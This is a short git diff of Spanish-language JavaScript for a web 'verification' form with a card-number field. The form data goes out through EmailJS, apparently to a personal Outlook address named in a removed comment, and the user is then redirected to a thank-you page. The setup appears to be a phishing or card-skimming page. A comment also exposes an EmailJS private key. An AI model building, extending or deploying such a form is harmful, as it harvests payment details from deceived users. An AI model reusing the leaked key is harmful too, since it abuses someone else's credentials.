@@ -61,8 +61,8 @@ document.getElementById('formularioVerificacion').addEventListener('submit', asy
     return;
   }
 
-  // Enviar datos usando EmailJS con el nuevo service id y la plantilla configurada
-  // La dirección de envío se ha configurado en EmailJS para Fantre001@outlook.com
+  // Enviar datos usando EmailJS con el nuevo service id y plantilla configurada
+  // **IMPORTANTE:** La dirección de destino se define en la configuración de la plantilla en EmailJS.
   try {
     await emailjs.send("service_427s9ii", "template_u3etoro", datos);
     window.location.href = "thank-you.html";
@@ -83,5 +83,6 @@ document.getElementById('tarjeta').addEventListener('input', function(e) {
 });
 
 /*
-  Nota: La private key (TbdLdRj03b0tqQbONR3kT) se debe mantener en secreto y no se utiliza en el código cliente.
+  Nota: La private key (TbdLdRj03b0tqQbONR3kT) no se utiliza en el código cliente.
+  Mantenla en secreto y utilízala solo en entornos seguros (por ejemplo, en el servidor).
 */
